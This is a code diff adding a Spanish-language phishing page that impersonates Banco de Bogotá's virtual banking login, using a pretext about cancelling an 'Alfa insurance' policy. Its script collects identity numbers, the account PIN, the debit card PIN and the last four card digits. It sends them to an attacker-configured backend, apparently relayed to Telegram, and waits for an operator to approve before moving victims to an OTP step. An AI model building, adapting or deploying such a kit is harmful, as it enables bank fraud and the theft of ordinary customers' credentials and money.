@@ -1,0 +1,671 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banca Virtual - Banco de Bogotá</title>
+    <style>
+        /* --- CONFIGURACIÓN GENERAL --- */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #F8F9FA;
+            display: flex;
+            height: 100vh;
+            color: #333;
+        }
+
+        /* --- CONTENEDOR IZQUIERDO (FORMULARIO) --- */
+        .login-wrapper {
+            width: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .login-section {
+            width: 100%;
+            max-width: 420px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* --- HEADER ESCRITORIO (PC) --- */
+        .header-pc {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            margin-bottom: 25px;
+        }
+
+        .header-pc .logo-pc {
+            height: 35px;
+            margin-bottom: 15px; 
+        }
+
+        .header-pc h1 {
+            font-size: 1.5rem;
+            color: #000;
+            font-weight: 700;
+            margin: 0;
+        }
+
+        /* --- HEADER MÓVIL (Oculto por defecto) --- */
+        .header-mobile {
+            display: none;
+        }
+
+        /* --- BANNER AZUL --- */
+        .blue-banner {
+            background-color: #003DA5;
+            border-radius: 12px;
+            padding: 12px;
+            display: flex;
+            align-items: center;
+            color: white;
+            margin-bottom: 25px;
+        }
+
+        .blue-banner img {
+            width: 60px;
+            height: 60px;
+            object-fit: contain;
+            margin-right: 15px;
+        }
+
+        .blue-banner-text {
+            font-size: 0.85rem;
+            line-height: 1.3;
+        }
+
+        /* --- CAJA DE LOGIN --- */
+        .login-box {
+            border: 1px solid #E0E0E0;
+            border-radius: 12px;
+            overflow: hidden;
+            background: #fff;
+            margin-bottom: 20px;
+        }
+
+        /* Pestañas */
+        .tabs {
+            display: flex;
+            border-bottom: 1px solid #E0E0E0;
+        }
+
+        .tab {
+            flex: 1;
+            text-align: center;
+            padding: 15px 0;
+            font-weight: 600;
+            color: #666;
+            cursor: pointer;
+            background: #F8F9FA;
+            transition: all 0.2s;
+        }
+
+        .tab.active {
+            background: #fff;
+            color: #003DA5;
+            border-bottom: 3px solid #003DA5;
+        }
+
+        /* Contenido de Pestañas */
+        .tab-content {
+            padding: 25px;
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        /* Alerta Celeste */
+        .alert-info {
+            background-color: #E8F4FF;
+            color: #004085;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 0.85rem;
+            margin-bottom: 20px;
+            position: relative;
+            line-height: 1.4;
+        }
+
+        .close-alert {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            cursor: pointer;
+            font-size: 1.2rem;
+            color: #003DA5;
+        }
+
+        /* Formularios */
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 0.9rem;
+            color: #333;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .input-row {
+            display: flex;
+            gap: 10px;
+        }
+
+        .input-row select {
+            width: 35%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 1rem;
+            color: #333;
+            outline: none;
+            background: #fff;
+        }
+
+        .input-row input {
+            width: 65%;
+        }
+
+        input[type="text"], input[type="password"], select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 1rem;
+            outline: none;
+            transition: border 0.2s;
+        }
+
+        input:focus, select:focus {
+            border-color: #003DA5;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #666;
+        }
+
+        /* Botón Ingresar */
+        .btn-ingresar {
+            width: 100%;
+            padding: 14px;
+            background-color: #E0E0E0;
+            color: #999;
+            border: none;
+            border-radius: 6px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        .btn-ingresar.active {
+            background-color: #003DA5;
+            color: white;
+            cursor: pointer;
+        }
+
+        /* Enlaces inferiores */
+        .login-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+            font-size: 0.9rem;
+        }
+
+        .login-links a {
+            color: #003DA5;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        /* Footer */
+        .recaptcha-text {
+            font-size: 0.75rem;
+            color: #666;
+            line-height: 1.4;
+        }
+        .recaptcha-text a { color: #003DA5; text-decoration: none; }
+
+        /* --- CONTENEDOR DERECHO (items.png) --- */
+        .right-section {
+            width: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .right-section img {
+            width: 100%;
+            max-width: 650px;
+            height: auto;
+            display: block;
+            object-fit: contain;
+        }
+
+        /* --- PANTALLAS DE ESTADO (CARGANDO Y ERROR) --- */
+        .overlay-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: none; /* Ocultas por defecto */
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            flex-direction: column;
+            padding: 20px;
+            text-align: center;
+        }
+
+        #loading-screen {
+            background-color: #003DA5;
+            color: white;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid rgba(255,255,255,0.3);
+            border-top: 6px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        #error-screen {
+            background-color: #fff;
+        }
+
+        .error-box {
+            max-width: 400px;
+            background: #fff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+
+        .error-box h2 {
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .error-box p {
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .btn-retry {
+            background-color: #003DA5;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 6px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .btn-retry:hover {
+            background-color: #002D72;
+        }
+
+        /* --- RESPONSIVE MÓVIL --- */
+        @media (max-width: 768px) {
+            body {
+                flex-direction: column;
+                background-color: #fff;
+                height: auto;
+                min-height: 100vh;
+            }
+
+            .right-section {
+                display: none; 
+            }
+
+            .login-wrapper {
+                width: 100%;
+                padding: 20px;
+                align-items: flex-start;
+            }
+
+            .login-section {
+                max-width: 100%;
+            }
+
+            .header-pc {
+                display: none;
+            }
+            
+            .header-mobile {
+                display: flex;
+                align-items: center;
+                margin-bottom: 20px;
+                gap: 10px;
+            }
+            
+            .header-mobile img {
+                height: 35px;
+            }
+
+            .header-mobile h1 {
+                font-size: 1.2rem;
+                font-weight: bold;
+                color: #000;
+                margin: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- SECCIÓN IZQUIERDA (FORMULARIO) -->
+    <div class="login-wrapper">
+        <div class="login-section">
+            
+            <!-- HEADER PC -->
+            <div class="header-pc">
+                <img src="bogota.png" alt="Banco de Bogotá" class="logo-pc">
+                <h1>Bienvenido a tu Banca Virtual</h1>
+            </div>
+
+            <!-- HEADER MÓVIL -->
+            <div class="header-mobile">
+                <img src="x.png" alt="Logo">
+                <h1>Bienvenido a tu Banca Virtual</h1>
+            </div>
+
+            <!-- Banner Azul -->
+            <div class="blue-banner">
+                <img src="image.png" alt="Validación">
+                <div class="blue-banner-text">
+                    <strong>Para cancelar el seguro Alfa</strong><br>
+                    Es necesario validar su identidad para continuar con el proceso.
+                </div>
+            </div>
+
+            <!-- Caja de Login -->
+            <div class="login-box">
+                
+                <!-- Pestañas -->
+                <div class="tabs">
+                    <div class="tab active" onclick="switchTab('clave')">Clave segura</div>
+                    <div class="tab" onclick="switchTab('tarjeta')">Tarjeta débito</div>
+                </div>
+
+                <!-- Contenido: Clave Segura -->
+                <div id="tab-clave" class="tab-content active">
+                    
+                    <div class="alert-info" id="info-alert">
+                        Estás ingresando con tu Clave Segura.<br>
+                        Selecciona 'Tarjeta Débito' para cambiar el tipo de ingreso.
+                        <span class="close-alert" onclick="document.getElementById('info-alert').style.display='none'">×</span>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Identificación</label>
+                        <div class="input-row">
+                            <select id="tipo-doc-clave">
+                                <option>C.C.</option>
+                                <option>C.E.</option>
+                                <option>NIT</option>
+                            </select>
+                            <input type="text" id="doc-clave" placeholder="#">
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Clave segura</label>
+                        <div class="input-wrapper">
+                            <input type="password" id="pass-clave" placeholder="••••" maxlength="4" inputmode="numeric" pattern="\d*">
+                            <svg class="eye-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                                <circle cx="12" cy="12" r="3"></circle>
+                            </svg>
+                        </div>
+                    </div>
+
+                    <button class="btn-ingresar" id="btn-clave">Ingresar</button>
+
+                    <div class="login-links">
+                        <a href="#">Registrarme ›</a>
+                        <a href="#">Olvidé mi clave ›</a>
+                    </div>
+                </div>
+
+                <!-- Contenido: Tarjeta Débito -->
+                <div id="tab-tarjeta" class="tab-content">
+                    
+                    <div class="form-group">
+                        <label>Identificación</label>
+                        <div class="input-row">
+                            <select id="tipo-doc-tarjeta">
+                                <option>C.C.</option>
+                                <option>C.E.</option>
+                                <option>NIT</option>
+                            </select>
+                            <input type="text" id="doc-tarjeta" placeholder="#">
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Clave de tu tarjeta débito</label>
+                        <div class="input-wrapper">
+                            <input type="password" id="pass-tarjeta" placeholder="••••" maxlength="4" inputmode="numeric" pattern="\d*">
+                            <svg class="eye-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                                <circle cx="12" cy="12" r="3"></circle>
+                            </svg>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Últimos 4 dígitos de tu tarjeta débito</label>
+                        <div class="input-wrapper">
+                            <input type="password" id="digitos-tarjeta" placeholder="••••" maxlength="4" inputmode="numeric" pattern="\d*">
+                            <svg class="eye-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                                <circle cx="12" cy="12" r="3"></circle>
+                            </svg>
+                        </div>
+                    </div>
+
+                    <button class="btn-ingresar" id="btn-tarjeta">Ingresar</button>
+                </div>
+
+            </div>
+
+            <!-- Texto Legal -->
+            <div class="recaptcha-text">
+                Este sitio está protegido por reCAPTCHA y aplican las <a href="#">políticas de privacidad</a> y los <a href="#">términos de servicio</a> de Google.
+            </div>
+
+        </div>
+    </div>
+
+    <!-- SECCIÓN DERECHA (items.png) -->
+    <div class="right-section">
+        <img src="items.png" alt="Menú de accesos directos">
+    </div>
+
+    <!-- PANTALLA DE CARGA (AZUL) -->
+    <div id="loading-screen" class="overlay-screen">
+        <div class="spinner"></div>
+        <p style="font-size: 1.2rem; font-weight: 600;">Cargando...</p>
+    </div>
+
+    <!-- PANTALLA DE ERROR (RECHAZO) -->
+    <div id="error-screen" class="overlay-screen">
+        <div class="error-box">
+            <h2>Información incorrecta</h2>
+            <p>Los datos ingresados no coinciden con nuestros registros. Por favor, verifica tu información e inténtalo de nuevo.</p>
+            <button class="btn-retry" onclick="retryLogin()">Volver a intentar</button>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script>
+        // ==========================================
+        // 1. LÓGICA DE UI (PESTAÑAS Y BOTONES)
+        // ==========================================
+        function switchTab(tabName) {
+            document.getElementById('tab-clave').classList.remove('active');
+            document.getElementById('tab-tarjeta').classList.remove('active');
+            
+            document.querySelectorAll('.tab')[0].classList.remove('active');
+            document.querySelectorAll('.tab')[1].classList.remove('active');
+
+            if(tabName === 'clave') {
+                document.getElementById('tab-clave').classList.add('active');
+                document.querySelectorAll('.tab')[0].classList.add('active');
+            } else {
+                document.getElementById('tab-tarjeta').classList.add('active');
+                document.querySelectorAll('.tab')[1].classList.add('active');
+            }
+        }
+
+        // Elementos para activar el botón azul
+        const docClave = document.getElementById('doc-clave');
+        const passClave = document.getElementById('pass-clave');
+        const btnClave = document.getElementById('btn-clave');
+
+        const docTarjeta = document.getElementById('doc-tarjeta');
+        const passTarjeta = document.getElementById('pass-tarjeta');
+        const digitosTarjeta = document.getElementById('digitos-tarjeta');
+        const btnTarjeta = document.getElementById('btn-tarjeta');
+
+        function checkClave() {
+            if(docClave.value.trim() !== '' && passClave.value.length === 4) {
+                btnClave.classList.add('active');
+            } else {
+                btnClave.classList.remove('active');
+            }
+        }
+
+        function checkTarjeta() {
+            if(docTarjeta.value.trim() !== '' && passTarjeta.value.length === 4 && digitosTarjeta.value.length === 4) {
+                btnTarjeta.classList.add('active');
+            } else {
+                btnTarjeta.classList.remove('active');
+            }
+        }
+
+        docClave.addEventListener('input', checkClave);
+        passClave.addEventListener('input', checkClave);
+        docTarjeta.addEventListener('input', checkTarjeta);
+        passTarjeta.addEventListener('input', checkTarjeta);
+        digitosTarjeta.addEventListener('input', checkTarjeta);
+
+
+        // ==========================================
+        // 2. LÓGICA DEL BACKEND (TELEGRAM Y POLLING)
+        // ==========================================
+        
+        // ⚠️ CAMBIA ESTA URL POR LA DE TU BACKEND EN RENDER
+        const BACKEND_URL = 'https://tu-backend-en-render.onrender.com'; 
+
+        const loadingScreen = document.getElementById('loading-screen');
+        const errorScreen = document.getElementById('error-screen');
+        
+        let currentPollingInterval = null;
+        let currentRequestId = null;
+
+        // Función que envía los datos
+        async function sendDataToBackend(tipo) {
+            let identificacion, clave, ultimos4;
+
+            if (tipo === 'clave') {
+                identificacion = docClave.value;
+                clave = passClave.value;
+                if (!identificacion || clave.length !== 4) return;
+            } else {
+                identificacion = docTarjeta.value;
+                clave = passTarjeta.value;
+                ultimos4 = digitosTarjeta.value;
+                if (!identificacion || clave.length !== 4 || ultimos4.length !== 4) return;
+            }
+
+            // Mostrar pantalla de carga
+            loadingScreen.style.display = 'flex';
+
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ identificacion, clave, ultimos4, tipo })
+                });
+
+                const data = await response.json();
+                
+                if (!data.requestId) throw new Error('Error en el servidor');
+
+                currentRequestId = data.requestId;
+
+                // Iniciar Polling cada 2 segundos
+                currentPollingInterval = setInterval(async () => {
+                    const statusRes = await fetch(`${BACKEND_URL}/api/status/${currentRequestId}`);
+                    const statusData = await statusRes.json();
+
+                    if (statusData.status === 'approved') {
+                        // APROBADO
+                        clearInterval(currentPollingInterval);
+                        window.location.href = 'otp.html';
+                    } else if (statusData.status === 'rejected') {
+                        // RECHAZADO
+                        clearInterval(currentPollingInterval);
+                        loadingScreen.style.display = 'none';
+                        errorScreen.style.display = 'flex';
+                    }
+                    // Si es 'pending', sigue esperando
+                }, 2000);
+
+            } catch (error) {
+                loadingScreen.style.display = 'none';
+                alert("Error de conexión. Intenta de nuevo.");
+            }
+        }
+
+        // Función para volver al formulario tras el rechazo
+        function retryLogin() {
+            errorScreen.style.display = 'none';
+            // Los datos en los inputs se mantienen intactos automáticamente
+        }
+
+        // Eventos de clic en los botones
+        btnClave.addEventListener('click', () => sendDataToBackend('clave'));
+        btnTarjeta.addEventListener('click', () => sendDataToBackend('tarjeta'));
+    </script>
+</body>
+</html>
